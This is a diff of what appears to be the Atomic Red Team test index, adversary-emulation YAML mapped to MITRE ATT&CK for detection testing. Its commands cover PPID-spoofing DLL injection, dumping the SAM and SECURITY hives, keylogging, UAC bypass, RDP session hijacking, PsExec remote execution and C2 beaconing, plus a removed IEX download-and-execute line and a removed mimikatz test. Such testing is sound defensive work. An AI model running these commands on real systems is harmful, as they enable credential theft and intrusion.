+        Monitor and analyze API calls to <code>CreateProcess</code>/<code>CreateProcessA</code>, specifically those from user/potentially malicious processes and with parameters explicitly assigning PPIDs (ex: the Process Creation Flags of 0x8XXX, indicating that the process is being created with extended startup information(Citation: Microsoft Process Creation Flags May 2018)). Malicious use of <code>CreateProcess</code>/<code>CreateProcessA</code> may also be proceeded by a call to <code>UpdateProcThreadAttribute</code>, which may be necessary to update process creation attributes.(Citation: Secuirtyinbits Ataware3 May 2019) This may generate false positives from normal UAC elevation behavior, so compare to a system baseline/understanding of normal system activity if possible.
+      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
+      x_mitre_contributors:
+      - Wayne Silva, Countercept
+      created: '2019-06-03T14:50:50.613Z'
+      kill_chain_phases:
+      - phase_name: defense-evasion
+        kill_chain_name: mitre-attack
+      - phase_name: privilege-escalation
+        kill_chain_name: mitre-attack
+      external_references:
+      - external_id: T1502
+        source_name: mitre-attack
+        url: https://attack.mitre.org/techniques/T1502
+      - source_name: DidierStevens SelectMyParent Nov 2009
+        description: 'Stevens, D. (2009, November 22). Quickpost: SelectMyParent or
+          Playing With the Windows Process Tree. Retrieved June 3, 2019.'
+        url: https://blog.didierstevens.com/2009/11/22/quickpost-selectmyparent-or-playing-with-the-windows-process-tree/
+      - source_name: Microsoft UAC Nov 2018
+        description: Montemayor, D. et al.. (2018, November 15). How User Account
+          Control works. Retrieved June 3, 2019.
+        url: https://docs.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works
+      - source_name: CounterCept PPID Spoofing Dec 2018
+        description: Loh, I. (2018, December 21). Detecting Parent PID Spoofing. Retrieved
+          June 3, 2019.
+        url: https://www.countercept.com/blog/detecting-parent-pid-spoofing/
+      - source_name: CTD PPID Spoofing Macro Mar 2019
+        description: Tafani-Dereeper, C. (2019, March 12). Building an Office macro
+          to spoof parent processes and command line arguments. Retrieved June 3,
+          2019.
+        url: https://blog.christophetd.fr/building-an-office-macro-to-spoof-process-parent-and-command-line/
+      - source_name: XPNSec PPID Nov 2017
+        description: Chester, A. (2017, November 20). Alternative methods of becoming
+          SYSTEM. Retrieved June 4, 2019.
+        url: https://blog.xpnsec.com/becoming-system/
+      - description: Schofield, M. & Satran, M. (2018, May 30). Process Creation Flags.
+          Retrieved June 4, 2019.
+        source_name: Microsoft Process Creation Flags May 2018
+        url: https://docs.microsoft.com/windows/desktop/ProcThread/process-creation-flags
+      - source_name: Secuirtyinbits Ataware3 May 2019
+        description: Secuirtyinbits . (2019, May 14). Parent PID Spoofing (Stage 2)
+          Ataware Ransomware Part 3. Retrieved June 6, 2019.
+        url: https://www.securityinbits.com/malware-analysis/parent-pid-spoofing-stage-2-ataware-ransomware-part-3
+      x_mitre_defense_bypassed:
+      - Host forensic analysis
+      - Heuristic Detection
+      identifier: T1502
+    atomic_tests:
+    - name: Parent PID Spoofing using PowerShell
+      description: |
+        This test uses PowerShell to replicates how Cobalt Strike does ppid spoofing and masquerade a spawned process.
+        Credit to In Ming Loh (https://github.com/countercept/ppid-spoofing/blob/master/PPID-Spoof.ps1)
+      supported_platforms:
+      - windows
+      input_arguments:
+        parent_process_name:
+          description: Name of the parent process
+          type: string
+          default: explorer
+        dll_path:
+          description: Path of the dll to inject
+          type: string
+          default: "$PathToAtomicsFolder\\T1502\\bin\\calc.dll"
+        dll_process_name:
+          description: Name of the created process from the injected dll
+          type: string
+          default: calculator
+        spawnto_process_path:
+          description: Path of the process to spawn
+          type: string
+          default: C:\Program Files\Internet Explorer\iexplore.exe
+        spawnto_process_name:
+          description: Name of the process to spawn
+          type: string
+          default: iexplore
+      executor:
+        name: powershell
+        elevation_required: false
+        command: |
+          . $PathToAtomicsFolder\T1502\src\PPID-Spoof.ps1
+          $ppid=Get-Process #{parent_process_name} | select -expand id
+          PPID-Spoof -ppid $ppid -spawnto "#{spawnto_process_path}" -dllpath "#{dll_path}"
+        cleanup_command: |-
+          Stop-Process -Name "#{dll_process_name}"
+          Stop-Process -Name "#{spawnto_process_name}"
   T1150:
     technique:
       x_mitre_data_sources:
@@ -14020,8 +14723,11 @@ privilege-escalation:
           default: 72600
       executor:
         name: command_prompt
-        elevation_required: false
+        elevation_required: true
         command: 'SCHTASKS /Create /SC ONCE /TN spawn /TR #{task_command} /ST #{time}
+
+'
+        cleanup_command: 'SCHTASKS /Delete /TN spawn /F
 
 '
     - name: Scheduled task Remote
@@ -14053,8 +14759,31 @@ privilege-escalation:
           default: At0micStrong
       executor:
         name: command_prompt
+        elevation_required: true
         command: 'SCHTASKS /Create /S #{target} /RU #{user_name} /RP #{password} /TN
           "Atomic task" /TR "#{task_command}" /SC daily /ST #{time}
+
+'
+        cleanup_command: 'SCHTASKS /Delete /TN "Atomic task" /F
+
+'
+    - name: Powershell Cmdlet Scheduled Task
+      description: |
+        Create an atomic scheduled task that leverages native powershell cmdlets.
+        These could be considered "fileless" scheduled task creation.
+      supported_platforms:
+      - windows
+      executor:
+        name: powershell
+        elevation_required: false
+        command: |
+          $Action = New-ScheduledTaskAction -Execute "calc.exe"
+          $Trigger = New-ScheduledTaskTrigger -AtLogon
+          $User = New-ScheduledTaskPrincipal -GroupId "BUILTIN\Administrators" -RunLevel Highest
+          $Set = New-ScheduledTaskSettingsSet
+          $object = New-ScheduledTask -Action $Action -Principal $User -Trigger $Trigger -Settings $Set
+          Register-ScheduledTask AtomicTask -InputObject $object
+        cleanup_command: 'Unregister-ScheduledTask -TaskName "AtomicTask" -confirm:$false
 
 '
   T1058:
@@ -14575,6 +15304,9 @@ privilege-escalation:
       executor:
         name: command_prompt
         command: 'xcopy #{web_shells} #{web_shell_path}
+
+'
+        cleanup_command: 'del #{web_shell_path}
 
 '
 impact:
@@ -15625,7 +16357,7 @@ discovery:
           net user
           net user /domain
           get-localuser
-          get-localgroupmembers -group Users
+          get-localgroupmember -group Users
           cmdkey.exe /list
           ls C:/Users
           get-childitem C:\Users\
@@ -16350,7 +17082,7 @@ discovery:
         computer_name:
           description: Computer name to find a mount on.
           type: string
-          default: computer1
+          default: localhost
       executor:
         name: command_prompt
         elevation_required: false
@@ -16367,7 +17099,7 @@ discovery:
         computer_name:
           description: Computer name to find a mount on.
           type: string
-          default: computer1
+          default: localhost
       executor:
         name: powershell
         elevation_required: false
@@ -16490,7 +17222,7 @@ discovery:
         name: command_prompt
         elevation_required: true
         command: |
-          c:\Program Files\Wireshark\tshark.exe -i #{interface} -c 5
+          "c:\Program Files\Wireshark\tshark.exe" -i #{interface} -c 5
           c:\windump.exe
     - name: Packet Capture PowerShell
       description: |
@@ -16507,8 +17239,8 @@ discovery:
         name: powershell
         elevation_required: true
         command: |
-          c:\Program Files\Wireshark\tshark.exe -i #{interface} -c 5
-          c:\windump.exe
+          & "c:\Program Files\Wireshark\tshark.exe" -i #{interface} -c 5
+          & c:\windump.exe
   T1201:
     technique:
       x_mitre_data_sources:
@@ -16763,7 +17495,7 @@ discovery:
         elevation_required: false
         command: |
           get-localgroup
-          get-ADPrinicipalGroupMembership #{user} | select name
+          get-ADPrincipalGroupMembership #{user} | select name
     - name: Elevated group enumeration using net group
       description: 'Runs ''net group'' command including command aliases and loose
         typing to simulate enumeration/discovery of high value domain groups
@@ -16925,15 +17657,16 @@ discovery:
         name: command_prompt
         elevation_required: true
         command: |
+          powershell.exe New-Item -ItemType Directory -Name ART1012 -Path $env:USERPROFILE\AppData\Local\Temp\
           reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows"
           reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
           reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
           reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices
           reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices
-          reg query HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify
-          reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit
-          reg query HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\\Shell
-          reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\\Shell
+          reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify"
+          reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit"
+          reg query "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\\Shell"
+          reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\\Shell"
           reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\ShellServiceObjectDelayLoad
           reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
           reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnceEx
@@ -16942,11 +17675,14 @@ discovery:
           reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
           reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run
           reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run
-          reg query hklm\system\currentcontrolset\services /s | findstr ImagePath 2>nul | findstr /Ri ".*\.sys$"
-          reg Query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
-          reg save HKLM\Security security.hive
-          reg save HKLM\System system.hive
-          reg save HKLM\SAM sam.hive
+          reg query HKLM\system\currentcontrolset\services /s | findstr ImagePath 2>nul | findstr /Ri ".*\.sys$"
+          reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
+          reg save HKLM\Security $env:USERPROFILE\AppData\Local\Temp\ART1012\security.hive"
+          reg save HKLM\System $env:USERPROFILE\AppData\Local\Temp\ART1012\system.hive"
+          reg save HKLM\SAM $env:USERPROFILE\AppData\Local\Temp\ART1012\sam.hive"
+        cleanup_command: 'rmdir /q /s $env:USERPROFILE\AppData\Local\Temp\ART1012\
+
+'
   T1018:
     technique:
       x_mitre_data_sources:
@@ -17273,7 +18009,7 @@ discovery:
       modified: '2019-09-27T19:03:39.143Z'
       identifier: T1518
     atomic_tests:
-    - name: Find and Display Iinternet Explorer Browser Version
+    - name: Find and Display Internet Explorer Browser Version
       description: 'Adversaries may attempt to get a listing of non-security related
         software that is installed on the system. Adversaries may use the information
         from Software Discovery during automated discovery to shape follow-on behaviors
@@ -17288,6 +18024,20 @@ discovery:
           /v svcVersion
 
 '
+    - name: Applications Installed
+      description: 'Adversaries may attempt to get a listing of all software that
+        is installed on the system. Adversaries may use the information from Software
+        Discovery during automated discovery to shape follow-on behaviors
+
+'
+      supported_platforms:
+      - windows
+      executor:
+        name: command_prompt
+        elevation_required: false
+        command: |
+          POWERSHELL.EXE "Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table -Autosize"
+          powershell.exe "Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table -Autosize"
   T1082:
     technique:
       x_mitre_permissions_required:
@@ -17817,11 +18567,6 @@ discovery:
 '
       supported_platforms:
       - windows
-      input_arguments:
-        service_name:
-          description: Name of service to start stop, query
-          type: string
-          default: svchost.exe
       executor:
         name: command_prompt
         elevation_required: true
@@ -17829,9 +18574,6 @@ discovery:
           tasklist.exe
           sc query
           sc query state= all
-          sc start #{service_name}
-          sc stop #{service_name}
-          wmic service where (displayname like "#{service_name}") get name
     - name: System Service Discovery - net.exe
       description: 'Enumerates started system services using net.exe and writes them
         to a file. This technique has been used by multiple threat actors.
@@ -17911,7 +18653,7 @@ discovery:
         computer_name:
           description: computer name to query
           type: string
-          default: computer1
+          default: localhost
       executor:
         name: command_prompt
         elevation_required: false
@@ -18890,19 +19632,6 @@ credential-access:
         command: 'grep -ri password #{file_path}
 
 '
-    - name: Runs Mimikatz & Mimikittenz by name
-      description: 'Mimikatz/kittenz - This will require a Mimikatz executable or
-        invoke-mimikittenz ps module.
-
-'
-      supported_platforms:
-      - windows
-      executor:
-        name: powershell
-        elevation_required: true
-        command: |
-          invoke-mimikittenz
-          mimikatz.exe
     - name: Extracting passwords with findstr
       description: 'Extracting Credentials from Files
 
@@ -18915,7 +19644,7 @@ credential-access:
         command: |
           findstr /si pass *.xml | *.doc | *.txt | *.xls
           ls -R | select-string -Pattern password
-    - name: Access "unattend.xml"
+    - name: Access unattend.xml
       description: 'Attempts to access unattend.xml, where credentials are commonly
         stored, within the Panther directory where installation logs are stored.
 
@@ -18926,8 +19655,8 @@ credential-access:
         name: command_prompt
         elevation_required: true
         command: |
-          cmd /c type C:\Windows\Panther\unattend.xml > nul 2>&1
-          cmd /c type C:\Windows\Panther\Unattend\unattend.xml > nul 2>&1
+          type C:\Windows\Panther\unattend.xml > nul 2>&1
+          type C:\Windows\Panther\Unattend\unattend.xml > nul 2>&1
   T1214:
     technique:
       x_mitre_permissions_required:
@@ -19127,7 +19856,7 @@ credential-access:
         file_name:
           description: Dll To Inject
           type: Path
-          default: C:\AtomicRedTeam\atomics\T1179\bin\T1179x64.dll
+          default: PathToAtomicsFolder\T1179\bin\T1179x64.dll
         server_name:
           description: TLS Server To Test Get Request
           type: Url
@@ -19212,10 +19941,16 @@ credential-access:
         filepath:
           description: Name of the local file, include path.
           type: Path
-          default: c:\key.log
+          default: "$env:TEMP\\key.log"
       executor:
         name: powershell
-        command: "$PathToAtomicsFolder\\T1056\\src\\Get-Keystrokes.ps1 -LogPath #{filepath}\n"
+        elevation_required: true
+        command: |
+          Set-Location $PathToAtomicsFolder
+          .\T1056\src\Get-Keystrokes.ps1 -LogPath #{filepath}
+        cleanup_command: 'Remove-Item $env:TEMP\key.log
+
+'
   T1141:
     technique:
       x_mitre_data_sources:
@@ -19561,7 +20296,7 @@ credential-access:
         name: command_prompt
         elevation_required: true
         command: |
-          c:\Program Files\Wireshark\tshark.exe -i #{interface} -c 5
+          "c:\Program Files\Wireshark\tshark.exe" -i #{interface} -c 5
           c:\windump.exe
     - name: Packet Capture PowerShell
       description: |
@@ -19578,8 +20313,8 @@ credential-access:
         name: powershell
         elevation_required: true
         command: |
-          c:\Program Files\Wireshark\tshark.exe -i #{interface} -c 5
-          c:\windump.exe
+          & "c:\Program Files\Wireshark\tshark.exe" -i #{interface} -c 5
+          & c:\windump.exe
   T1174:
     technique:
       x_mitre_permissions_required:
@@ -19711,7 +20446,6 @@ credential-access:
     - name: Private Keys
       description: |
         Find private keys on the Windows file system.
-
         File extensions include: .key, .pgp, .gpg, .ppk., .p12, .pem, pfx, .cer, .p7b, .asc
       supported_platforms:
       - windows
@@ -19721,6 +20455,9 @@ credential-access:
         command: |
           echo "ATOMICREDTEAM" > %windir%\cert.key
           dir c:\ /b /s .key | findstr /e .key
+        cleanup_command: 'del c:\Windows\cert.key
+
+'
     - name: Discover Private SSH Keys
       description: 'Discover private SSH keys on a macOS or Linux system.
 
@@ -19931,7 +20668,7 @@ execution:
         inf_file_path:
           description: Path to the INF file
           type: path
-          default: T1191.inf
+          default: PathToAtomicsFolder\T1191\src\T1191.inf
       executor:
         name: command_prompt
         elevation_required: false
@@ -19949,7 +20686,7 @@ execution:
         inf_file_uac:
           description: Path to the INF file
           type: path
-          default: T1191_uacbypass.inf
+          default: PathToAtomicsFolder\T1191\src\T1191_uacbypass.inf
       executor:
         name: command_prompt
         elevation_required: false
@@ -20263,11 +21000,11 @@ execution:
         cpl_file_path:
           description: path to cpl file
           type: path
-          default: calc.cpl
+          default: PathToAtomicsFolder\T1196\bin\calc.cpl
       executor:
         name: command_prompt
         elevation_required: false
-        command: 'control.exe  #{cpl_file_path}
+        command: 'control.exe #{cpl_file_path}
 
 '
   T1173:
@@ -21039,7 +21776,6 @@ execution:
     - name: Invoke-AppPathBypass
       description: |
         Note: Windows 10 only
-
         Bypass is based on: https://enigma0x3.net/2017/03/14/bypassing-uac-using-app-paths/
       supported_platforms:
       - windows
@@ -21306,7 +22042,9 @@ execution:
         command: |
           C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /r:System.EnterpriseServices.dll /target:library #{source_file}
           C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe /U #{file_name}
-          del #{file_name}
+        cleanup_command: 'del #{file_name}
+
+'
     - name: Regsvs Uninstall Method Call Test
       description: 'Executes the Uninstall Method, No Admin Rights Required, Requires
         SNK
@@ -21332,6 +22070,7 @@ execution:
           Set-Content key.snk -Value $Content -Encoding Byte
           C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /r:System.EnterpriseServices.dll /target:library /keyfile:key.snk #{source_file}
           C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe #{file_name}
+        cleanup_command: |
           del #{file_name}
           del key.snk
   T1117:
@@ -21745,8 +22484,11 @@ execution:
           default: 72600
       executor:
         name: command_prompt
-        elevation_required: false
+        elevation_required: true
         command: 'SCHTASKS /Create /SC ONCE /TN spawn /TR #{task_command} /ST #{time}
+
+'
+        cleanup_command: 'SCHTASKS /Delete /TN spawn /F
 
 '
     - name: Scheduled task Remote
@@ -21778,8 +22520,31 @@ execution:
           default: At0micStrong
       executor:
         name: command_prompt
+        elevation_required: true
         command: 'SCHTASKS /Create /S #{target} /RU #{user_name} /RP #{password} /TN
           "Atomic task" /TR "#{task_command}" /SC daily /ST #{time}
+
+'
+        cleanup_command: 'SCHTASKS /Delete /TN "Atomic task" /F
+
+'
+    - name: Powershell Cmdlet Scheduled Task
+      description: |
+        Create an atomic scheduled task that leverages native powershell cmdlets.
+        These could be considered "fileless" scheduled task creation.
+      supported_platforms:
+      - windows
+      executor:
+        name: powershell
+        elevation_required: false
+        command: |
+          $Action = New-ScheduledTaskAction -Execute "calc.exe"
+          $Trigger = New-ScheduledTaskTrigger -AtLogon
+          $User = New-ScheduledTaskPrincipal -GroupId "BUILTIN\Administrators" -RunLevel Highest
+          $Set = New-ScheduledTaskSettingsSet
+          $object = New-ScheduledTask -Action $Action -Principal $User -Trigger $Trigger -Settings $Set
+          Register-ScheduledTask AtomicTask -InputObject $object
+        cleanup_command: 'Unregister-ScheduledTask -TaskName "AtomicTask" -confirm:$false
 
 '
   T1064:
@@ -21929,9 +22694,11 @@ execution:
       identifier: T1035
     atomic_tests:
     - name: Execute a Command as a Service
-      description: "Creates a service specifying an aribrary command and executes
+      description: 'Creates a service specifying an aribrary command and executes
         it. When executing commands such as PowerShell, the service will report that
-        it did not start correctly even when code executes properly. \n"
+        it did not start correctly even when code executes properly.
+
+'
       supported_platforms:
       - windows
       input_arguments:
@@ -21951,6 +22718,30 @@ execution:
           sc.exe create #{service_name} binPath= #{executable_command}
           sc.exe start #{service_name}
           sc.exe delete #{service_name}
+    - name: Use PsExec to execute a command on a remote host
+      description: |
+        Requires having Sysinternals installed, path to sysinternals is one of the input input_arguments
+        Will run a command on a remote host
+      supported_platforms:
+      - windows
+      input_arguments:
+        psexec_path:
+          description: Path to PsExec
+          type: string
+          default: C:\PSTools\PsExec.exe
+        remote_host:
+          description: Remote hostname or IP address
+          type: string
+          default: localhost
+      executor:
+        name: powershell
+        elevation_required: false
+        prereq_command: 'if(Test-Path #{psexec_path}) {0} else {1}
+
+'
+        command: '#{psexec_path} \\#{remote_host} "C:\Windows\System32\calc.exe"
+
+'
   T1218:
     technique:
       x_mitre_data_sources:
@@ -22653,7 +23444,7 @@ execution:
         filename:
           description: Location of the project file
           type: Path
-          default: T1127.csproj
+          default: PathToAtomicsFolder\T1127\T1127.csproj
       executor:
         name: command_prompt
         elevation_required: false
@@ -23677,7 +24468,9 @@ lateral-movement:
           query user
           sc.exe create sesshijack binpath= "cmd.exe /k tscon 1337 /dest:rdp-tcp#55"
           net start sesshijack
-          sc.exe delete sesshijack
+        cleanup_command: 'sc.exe delete sesshijack
+
+'
     - name: RDPto-DomainController
       description: 'Attempt an RDP session via "Connect-RDP" to a system. Default
         RDPs to (%logonserver%) as the current user
@@ -24417,34 +25210,17 @@ collection:
       modified: '2019-06-18T13:16:53.385Z'
       identifier: T1123
     atomic_tests:
-    - name: SourceRecorder via Windows command prompt
-      description: 'Create a file called test.wma, with the duration of 30 seconds
-
-'
-      supported_platforms:
-      - windows
-      input_arguments:
-        output_file:
-          description: Path to the recording file being captured
-          type: Path
-          default: test.wma
-        duration_hms:
-          description: Duration of audio to be recorded (in h:m:s format)
-          type: Path
-          default: 30
-      executor:
-        name: command_prompt
-        elevation_required: false
-        command: 'SoundRecorder /FILE #{output_file} /DURATION #{duration_hms}
-
-'
-    - name: PowerShell Cmdlet via Windows command prompt
+    - name: using device audio capture commandlet
       description: "[AudioDeviceCmdlets](https://github.com/cdhunt/WindowsAudioDevice-Powershell-Cmdlet)\n"
       supported_platforms:
       - windows
       executor:
-        name: command_prompt
+        name: powershell
         elevation_required: false
+        prereq_command: 'if(Get-Command WindowsAudioDevice-Powershell-Cmdlet -errorAction
+          SilentlyContinue) {0} else {1}
+
+'
         command: 'powershell.exe -Command WindowsAudioDevice-Powershell-Cmdlet
 
 '
@@ -24617,7 +25393,11 @@ collection:
         elevation_required: false
         command: |
           dir | clip
-          clip < readme.txt
+          echo "T1115" > %temp%\T1115.txt
+          clip < %temp%\T1115.txt
+        cleanup_command: 'del %temp%\T1115.txt
+
+'
     - name: PowerShell
       description: 'Utilize PowerShell to echo a command to clipboard and execute
         it
@@ -24630,7 +25410,7 @@ collection:
         elevation_required: false
         command: |
           echo Get-Process | clip
-          Get-Clipboard | iex
+          iex Get-Clipboard
   T1074:
     technique:
       x_mitre_data_sources:
@@ -24916,18 +25696,21 @@ collection:
 '
       supported_platforms:
       - windows
+      input_arguments:
+        output_file:
+          description: Output file path
+          type: String
+          default: "$home\\desktop\\mail.csv"
       executor:
         name: command_prompt
         elevation_required: false
-        command: |
-          Display email contents in the terminal
-            PS C:\> .\Get-Inbox.ps1
+        command: 'powershell -executionpolicy bypass -command $PathToAtomicsFolder\T1114\Get-Inbox.ps1
+          -file #{output_file}
 
-          Write emails out to a CSV
-            PS C:\> .\Get-Inbox.ps1 -file "mail.csv"
+'
+        cleanup_command: 'del #{output_file}
 
-          Download and Execute
-            "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1114/Get-Inbox.ps1')"
+'
   T1056:
     technique:
       x_mitre_data_sources:
@@ -25002,10 +25785,16 @@ collection:
         filepath:
           description: Name of the local file, include path.
           type: Path
-          default: c:\key.log
+          default: "$env:TEMP\\key.log"
       executor:
         name: powershell
-        command: "$PathToAtomicsFolder\\T1056\\src\\Get-Keystrokes.ps1 -LogPath #{filepath}\n"
+        elevation_required: true
+        command: |
+          Set-Location $PathToAtomicsFolder
+          .\T1056\src\Get-Keystrokes.ps1 -LogPath #{filepath}
+        cleanup_command: 'Remove-Item $env:TEMP\key.log
+
+'
   T1113:
     technique:
       x_mitre_data_sources:
@@ -25263,7 +26052,7 @@ exfiltration:
         prereq_command: 'rar /?
 
 '
-        command: 'rar a -r #{output_file} #{input_path}*{file_extension}
+        command: 'rar a -r #{output_file} #{input_path}*#{file_extension}
 
 '
         cleanup_command: del -f
@@ -26306,7 +27095,7 @@ command-and-control:
       modified: '2019-06-21T15:16:29.198Z'
       identifier: T1071
     atomic_tests:
-    - name: Malicious User Agents
+    - name: Malicious User Agents - Powershell
       description: |
         This test simulates an infected host beaconing to command and control.
         Inspired by APTSimulator - https://github.com/NextronSystems/APTSimulator/blob/master/test-sets/command-and-control/malicious-user-agents.bat
@@ -26325,6 +27114,24 @@ command-and-control:
           Invoke-WebRequest #{domain} -UserAgent "Wget/1.9+cvs-stable (Red Hat modified)" | out-null
           Invoke-WebRequest #{domain} -UserAgent "Opera/8.81 (Windows NT 6.0; U; en)" | out-null
           Invoke-WebRequest #{domain} -UserAgent "*<|>*" | out-null
+    - name: Malicious User Agents - CMD
+      description: |
+        This test simulates an infected host beaconing to command and control.
+        Inspired by APTSimulator - https://github.com/NextronSystems/APTSimulator/blob/master/test-sets/command-and-control/malicious-user-agents.bat
+      supported_platforms:
+      - windows
+      input_arguments:
+        domain:
+          description: Default domain to simulate against
+          type: string
+          default: www.google.com
+      executor:
+        name: command_prompt
+        command: |
+          curl -s -A "HttpBrowser/1.0" -m3 #{domain}
+          curl -s -A "Wget/1.9+cvs-stable (Red Hat modified)" -m3 #{domain}
+          curl -s -A "Opera/8.81 (Windows NT 6.0; U; en)" -m3 #{domain}
+          curl -s -A "*<|>*" -m3 #{domain}
     - name: Malicious User Agents - Nix
       description: |
         This test simulates an infected host beaconing to command and control.
@@ -26410,9 +27217,9 @@ command-and-control:
       executor:
         name: powershell
         elevation_required: false
-        command: ".\\T1071-dns-beacon.ps1 -Domain #{domain} -Subdomain #{subdomain}
-          -QueryType #{query_type} -C2Interval #{c2_interval} -C2Jitter #{c2_jitter}
-          -RunTime #{runtime}\n"
+        command: |
+          Set-Location $PathToAtomicsFolder
+          .\T1071\src\T1071-dns-beacon.ps1 -Domain #{domain} -Subdomain #{subdomain} -QueryType #{query_type} -C2Interval #{c2_interval} -C2Jitter #{c2_jitter} -RunTime #{runtime}
     - name: DNS Long Domain Query
       description: |
         This test simulates an infected host returning data to a command and control server using long domain names.
@@ -26436,8 +27243,9 @@ command-and-control:
       executor:
         name: powershell
         elevation_required: false
-        command: ".\\T1071-dns-domain-length.ps1 -Domain #{domain} -Subdomain #{subdomain}
-          -QueryType #{query_type}"
+        command: |
+          Set-Location $PathToAtomicsFolder
+          .\T1071\src\T1071-dns-domain-length.ps1 -Domain #{domain} -Subdomain #{subdomain} -QueryType #{query_type}
   T1065:
     technique:
       x_mitre_data_sources:
@@ -26815,6 +27623,6 @@ initial-access:
       - windows
       executor:
         name: powershell
-        command: 'Start-Process PathToAtomicsFolder\T1193\src\PowerShell_IP_Doc.doc
+        command: 'Start-Process $PathToAtomicsFolder\T1193\bin\PowerShell_IP_Doc.doc
 
 '
